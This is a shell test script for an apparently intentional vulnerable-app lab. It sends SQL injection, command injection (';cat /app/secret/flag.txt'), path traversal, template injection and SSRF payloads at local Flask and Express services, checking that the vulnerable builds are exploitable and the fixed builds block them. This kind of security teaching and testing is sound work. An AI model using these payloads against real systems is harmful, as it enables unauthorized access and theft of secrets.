#!/usr/bin/env bash
# Fires every payload from GUIDE.md at both the vulnerable and the fixed services.
#   vulnerable side: PASS = the exploit worked (the planted bug is live)
#   fixed side:      PASS = the exploit was blocked (the sanitizer held)
# Usage: ./check.sh              (vuln :5001/:3000, fixed :5002/:3002)
#        ./check.sh vuln         only the vulnerable side
#        ./check.sh fixed        only the fixed side
FLASK="${FLASK:-http://localhost:5001}"
EXPRESS="${EXPRESS:-http://localhost:3000}"
FLASK_FIXED="${FLASK_FIXED:-http://localhost:5002}"
EXPRESS_FIXED="${EXPRESS_FIXED:-http://localhost:3002}"
MODE="${1:-both}"
fail=0

hit() { curl -s --max-time 8 "$1"; }
# expect_hit name url needle      -> PASS when needle present
expect_hit() { if hit "$2" | grep -q -- "$3"; then printf "  PASS  %-20s exploit works\n" "$1"; else printf "  FAIL  %-20s exploit did not work\n" "$1"; fail=1; fi; }
# expect_blocked name url needle  -> PASS when needle absent
expect_blocked() { if hit "$2" | grep -q -- "$3"; then printf "  FAIL  %-20s payload got through\n" "$1"; fail=1; else printf "  PASS  %-20s blocked\n" "$1"; fi; }

payloads() { # $1 base, $2 app (flask|express), $3 checker
  local B="$1" C="$3" ssti other
  if [ "$2" = flask ]; then ssti="%7B%7B7*7%7D%7D"; other=3000; else ssti="%3C%25=7*7%25%3E"; other=5000; fi
  $C "1 sqli      /user"  "$B/user?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets" "FLAG{sqli"
  $C "2 cmdi      /ping"  "$B/ping?host=127.0.0.1%3Bcat%20/app/secret/flag.txt" "FLAG{you_reached"
  $C "3 traversal /docs"  "$B/docs?name=..%2F..%2Fsecret%2Fflag.txt" "FLAG{you_reached"
  $C "4 ssti      /hello" "$B/hello?name=$ssti" "Hello 49"
  $C "5 ssrf      /fetch" "$B/fetch?url=http://127.0.0.1:$other/user?id=2" "bob@example.com"
}

run_side() { # $1 label, $2 base, $3 app, $4 checker
  echo "== $1  $2"
  curl -s --max-time 5 -o /dev/null "$2/" || { echo "  not reachable"; fail=1; return; }
  payloads "$2" "$3" "$4"
  expect_blocked "decoy      /order" "$2/order?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets" "FLAG{"
}

if [ "$MODE" = both ] || [ "$MODE" = vuln ]; then
  run_side "VULNERABLE flask"   "$FLASK"   flask   expect_hit
  run_side "VULNERABLE express" "$EXPRESS" express expect_hit
fi
if [ "$MODE" = both ] || [ "$MODE" = fixed ]; then
  run_side "FIXED flask"   "$FLASK_FIXED"   flask   expect_blocked
  run_side "FIXED express" "$EXPRESS_FIXED" express expect_blocked
fi

echo
[ $fail -eq 0 ] && echo "ALL PASS" || { echo "SOMETHING FAILED (see above)"; exit 1; }
